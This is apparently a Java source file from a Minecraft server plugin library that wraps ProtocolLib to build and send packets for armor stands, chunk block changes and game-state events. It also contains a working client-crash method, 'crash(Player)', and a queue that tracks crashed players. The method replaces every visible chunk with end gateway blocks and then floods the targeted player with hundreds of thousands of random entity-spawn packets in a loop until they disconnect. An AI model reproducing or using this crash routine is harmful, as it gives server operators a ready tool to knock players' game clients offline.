package net.dehasher.hlib.hook;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketAdapter;
import com.comphenix.protocol.events.PacketEvent;
import com.comphenix.protocol.wrappers.*;
import com.google.common.collect.Lists;
import lombok.Getter;
import net.dehasher.hlib.wrapper.packet.bukkit.*;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import net.dehasher.hlib.Scheduler;
import net.dehasher.hlib.data.NMS;
import net.dehasher.hlib.Tools;
import org.bukkit.plugin.Plugin;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.wrappers.BlockPosition;
import com.comphenix.protocol.wrappers.WrappedBlockData;
import net.dehasher.hlib.data.BukkitVersion;
import java.util.Arrays;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.*;

public class ProtocolLibHook {
	private static final CrashQueue CRASH_QUEUE = new CrashQueue();
	private static final Random RANDOM = new Random();
	private static final List<EntityType> RANDOM_ENTITY = List.of(
			EntityType.ELDER_GUARDIAN,   EntityType.WITHER_SKELETON,
			EntityType.STRAY,            EntityType.HUSK,
			EntityType.ZOMBIE_VILLAGER,  EntityType.SKELETON_HORSE,
			EntityType.ZOMBIE_HORSE,     EntityType.ARMOR_STAND,
			EntityType.DONKEY,           EntityType.MULE,
			EntityType.EVOKER,           EntityType.VEX,
			EntityType.VINDICATOR,       EntityType.ILLUSIONER,
			EntityType.SKELETON,         EntityType.SPIDER,
			EntityType.SLIME,            EntityType.GHAST,
			EntityType.ZOMBIFIED_PIGLIN, EntityType.ENDERMAN,
			EntityType.CAVE_SPIDER,      EntityType.SILVERFISH,
			EntityType.BLAZE,            EntityType.MAGMA_CUBE,
			EntityType.WITCH,            EntityType.ENDERMITE,
			EntityType.GUARDIAN,         EntityType.SHULKER,
			EntityType.PIG,              EntityType.SHEEP,
			EntityType.COW,              EntityType.CHICKEN,
			EntityType.SQUID,            EntityType.WOLF,
			EntityType.OCELOT,           EntityType.IRON_GOLEM,
			EntityType.HORSE,            EntityType.RABBIT,
			EntityType.POLAR_BEAR,       EntityType.LLAMA,
			EntityType.PARROT,           EntityType.VILLAGER,
			EntityType.TURTLE,           EntityType.PHANTOM,
			EntityType.TRIDENT,          EntityType.COD,
			EntityType.SALMON,           EntityType.PUFFERFISH,
			EntityType.TROPICAL_FISH,    EntityType.DROWNED,
			EntityType.DOLPHIN,          EntityType.CAT,
			EntityType.PANDA,            EntityType.PILLAGER,
			EntityType.RAVAGER,          EntityType.TRADER_LLAMA,
			EntityType.WANDERING_TRADER, EntityType.FOX,
			EntityType.BEE,              EntityType.HOGLIN,
			EntityType.PIGLIN,           EntityType.STRIDER,
			EntityType.ZOGLIN,           EntityType.PIGLIN_BRUTE,
			EntityType.ZOMBIE);

	public static ProtocolManager getPlugin() {
		return ProtocolLibrary.getProtocolManager();
	}

	public static CrashQueue getCrashQueue() {
		return CRASH_QUEUE;
	}

	public static void register(PacketAdapter adapter) {
		getPlugin().addPacketListener(adapter);
	}

	public static void unregister(PacketAdapter adapter) {
		getPlugin().removePacketListener(adapter);
	}

	public static void unregisterAll(Plugin adapter) {
		getPlugin().removePacketListeners(adapter);
	}

	public static class Methods {
		public static void crash(Player player) {
			if (getCrashQueue().getCrashedPlayers().contains(player.getName())) return;
			if (Tools.isNPC(player)) return;

			getCrashQueue().add(player.getName());

			// Бесконечный цикл краша частицами, пока игрок не ливнет.
			// Крашит спустя 0.3 секунды после выполнения.
			Scheduler.doAsync(() -> {
				ChunkPacket.sendVisible(player, WrappedBlockData.createData(Material.END_GATEWAY));
				WrapperPlayServerSpawnEntity entity = new WrapperPlayServerSpawnEntity();
				Block block = player.getLocation().getBlock();
				entity.setX((float) block.getX());
				entity.setY((float) block.getY() - 10);
				entity.setZ((float) block.getZ());

				while (player.isOnline()) {
					for (int i = 0; i < 666666; i++) {
						entity.setUniqueId(UUID.randomUUID());
						entity.setEntityID(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE));
						entity.setType(RANDOM_ENTITY.get(RANDOM.nextInt(RANDOM_ENTITY.size())));
						entity.sendPacket(player);
					}

					Tools.sleep(1000L * 10);
				}
			});
		}

		public static Player getPlayer(PacketEvent e) {
			Player tempPlayer = e.getPlayer();
			if (tempPlayer == null || !tempPlayer.isOnline()) return null;
			if (e.isPlayerTemporary()) return null;
			String name = tempPlayer.getName();
			Player player = Bukkit.getPlayerExact(name);
			if (player == null || !player.isOnline()) return null;
			return player;
		}
	}

	public static class ArmorStand {

		public static WrapperPlayServerSpawnEntity create(Location location) {
			return create(location.getX(), location.getY(), location.getZ(), location.getPitch(), location.getYaw());
		}

		public static WrapperPlayServerSpawnEntity create(double x, double y, double z, float pitch, float yaw) {
			WrapperPlayServerSpawnEntity stand = new WrapperPlayServerSpawnEntity();

			stand.setType(EntityType.ARMOR_STAND);

			stand.setUniqueId(UUID.randomUUID());
			stand.setEntityID(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE));

			stand.setX(x);
			stand.setY(y);
			stand.setZ(z);
			stand.setPitch(pitch);
			stand.setYaw(yaw);

			return stand;
		}

		public static WrapperPlayServerEntityMetadata setup(WrapperPlayServerSpawnEntity stand, boolean invisible, boolean noGravity, String name) {
			return setup(stand.getEntityID(), invisible, noGravity, name);
		}

		@SuppressWarnings("removal")
		public static WrapperPlayServerEntityMetadata setup(int standID, boolean invisible, boolean noGravity, String name) {
			WrapperPlayServerEntityMetadata meta = new WrapperPlayServerEntityMetadata();
			List<WrappedWatchableObject> list = Lists.newArrayList();
			meta.setEntityID(standID);

			if (invisible) list.add(new WrappedWatchableObject(new WrappedDataWatcher.WrappedDataWatcherObject(0, WrappedDataWatcher.Registry.get(Byte.class)), (byte) 0x20));
			if (name != null && !name.isEmpty()) {
				list.add(new WrappedWatchableObject(new WrappedDataWatcher.WrappedDataWatcherObject(2, WrappedDataWatcher.Registry.getChatComponentSerializer(true)), Optional.ofNullable(WrappedChatComponent.fromLegacyText(name).getHandle())));
				list.add(new WrappedWatchableObject(new WrappedDataWatcher.WrappedDataWatcherObject(3, WrappedDataWatcher.Registry.get(Boolean.class)), true));
			}
			if (noGravity) list.add(new WrappedWatchableObject(new WrappedDataWatcher.WrappedDataWatcherObject(5, WrappedDataWatcher.Registry.get(Boolean.class)), true));
			list.add(new WrappedWatchableObject(new WrappedDataWatcher.WrappedDataWatcherObject(NMS.Packets.ARMOR_STAND_META_INDEX, WrappedDataWatcher.Registry.get(Byte.class)), (byte) (0x01 | 0x08 | 0x10)));

			meta.setMetadata(list);
			return meta;
		}

		public static WrapperPlayServerEntityEquipment equip(WrapperPlayServerSpawnEntity stand, EnumWrappers.ItemSlot slot, ItemStack item) {
			return equip(stand.getEntityID(), slot, item);
		}

		public static WrapperPlayServerEntityEquipment equip(int stand, EnumWrappers.ItemSlot slot, ItemStack item) {
			WrapperPlayServerEntityEquipment equip = new WrapperPlayServerEntityEquipment();
			equip.setEntityID(stand);
			equip.setSlotStackPair(slot, item);
			return equip;
		}

		public static void remove(Player player, WrapperPlayServerSpawnEntity stand) {
			if (stand == null) return;
			remove(player, stand.getEntityID());
		}

		public static void remove(Player player, int stand) {
			WrapperPlayServerEntityDestroy destroy = new WrapperPlayServerEntityDestroy();
			destroy.setEntityId(stand);
			if (player != null) {
				destroy.sendPacket(player);
			} else {
				destroy.broadcastPacket();
			}
		}
	}

	public static final class ChunkPacket {
		private static final int SECTION_SIZE = 16;
		private static final int BLOCKS_PER_SECTION = SECTION_SIZE * SECTION_SIZE * SECTION_SIZE;
		private static final short[] POSITIONS = createPositions();

		public static void sendVisible(Player player, WrappedBlockData blockData) {
			WrappedBlockData[] blocks = createReplacementBlocks(blockData);
			Chunk center = player.getLocation().getChunk();
			World world = player.getWorld();
			int viewDistance = Math.min(player.getClientViewDistance(), world.getViewDistance());

			for (int chunkX = center.getX() - viewDistance; chunkX <= center.getX() + viewDistance; chunkX++) {
				for (int chunkZ = center.getZ() - viewDistance; chunkZ <= center.getZ() + viewDistance; chunkZ++) {
					if (!world.isChunkLoaded(chunkX, chunkZ)) continue;

					sendChunk(player, chunkX, chunkZ, blocks);
				}
			}
		}

		private static void sendChunk(Player player, int chunkX, int chunkZ, WrappedBlockData[] blocks) {
			ProtocolManager protocolManager = ProtocolLibrary.getProtocolManager();
			World world = player.getWorld();
			int minSectionY = getMinSectionY(world);
			int maxSectionY = Math.floorDiv(world.getMaxHeight() - 1, SECTION_SIZE);

			for (int sectionY = minSectionY; sectionY <= maxSectionY; sectionY++) {
				sendSection(protocolManager, player, chunkX, sectionY, chunkZ, blocks);
			}
		}

		private static void sendSection(ProtocolManager protocolManager, Player player, int chunkX, int sectionY, int chunkZ, WrappedBlockData[] blocks) {
			try {
				PacketContainer packet = protocolManager.createPacket(PacketType.Play.Server.MULTI_BLOCK_CHANGE);

				packet.getSectionPositions().write(0, new BlockPosition(chunkX, sectionY, chunkZ));
				packet.getShortArrays().write(0, POSITIONS);
				packet.getBlockDataArrays().write(0, blocks);

				if (!Tools.requireBukkitVersion(BukkitVersion.V1_21)) packet.getBooleans().write(0, true);

				protocolManager.sendServerPacket(player, packet, false);
			} catch (Throwable t) {
				throw new IllegalStateException(
						"Failed to send replacement packet for section " + chunkX + ", " + sectionY + ", " + chunkZ,
						t
				);
			}
		}

		private static int getMinSectionY(World world) {
			if (!Tools.requireBukkitVersion(BukkitVersion.V1_21)) return 0;

			try {
				int minHeight = (Integer) World.class.getMethod("getMinHeight").invoke(world);
				return Math.floorDiv(minHeight, SECTION_SIZE);
			} catch (ReflectiveOperationException e) {
				throw new IllegalStateException("Failed to get world minimum height", e);
			}
		}

		private static short[] createPositions() {
			short[] positions = new short[BLOCKS_PER_SECTION];
			int index = 0;

			for (int x = 0; x < SECTION_SIZE; x++) {
				for (int z = 0; z < SECTION_SIZE; z++) {
					for (int y = 0; y < SECTION_SIZE; y++) {
						positions[index++] = (short) ((x << 8) | (z << 4) | y);
					}
				}
			}

			return positions;
		}

		private static WrappedBlockData[] createReplacementBlocks(WrappedBlockData blockData) {
			WrappedBlockData[] blocks = new WrappedBlockData[BLOCKS_PER_SECTION];
			Arrays.fill(blocks, blockData);
			return blocks;
		}
	}

	public enum GameEvent {
		guardian(10, 0), demo(5, 0),
		survival(3, 0), creative(3, 1),
		adventure(3, 2), spectator(3, 3);

		private final int reason;
		private final int value;

		GameEvent(int reason, int value) {
			this.reason = reason;
			this.value  = value;
		}

		public void run(String name) {
			Player player = Bukkit.getPlayerExact(name);
			if (player != null) run(player);
		}

		public void run(Player player) {
			if (player == null) return;
			WrapperPlayServerGameStateChange packet = new WrapperPlayServerGameStateChange();
			packet.setReason(reason);
			packet.setValue(value);
			packet.sendPacket(player);
		}
	}

	@Getter
	public static class CrashQueue {
		private static final int MAX_SIZE = 3;
		private final Set<String> crashedPlayers = ConcurrentHashMap.newKeySet();
		private final LinkedList<String> order = new LinkedList<>();

		public void add(String value) {
			if (getCrashedPlayers().size() == MAX_SIZE) {
				String oldest = getOrder().removeFirst();
				getCrashedPlayers().remove(oldest);
			}
			if (getCrashedPlayers().add(value)) getOrder().add(value);
		}
	}
}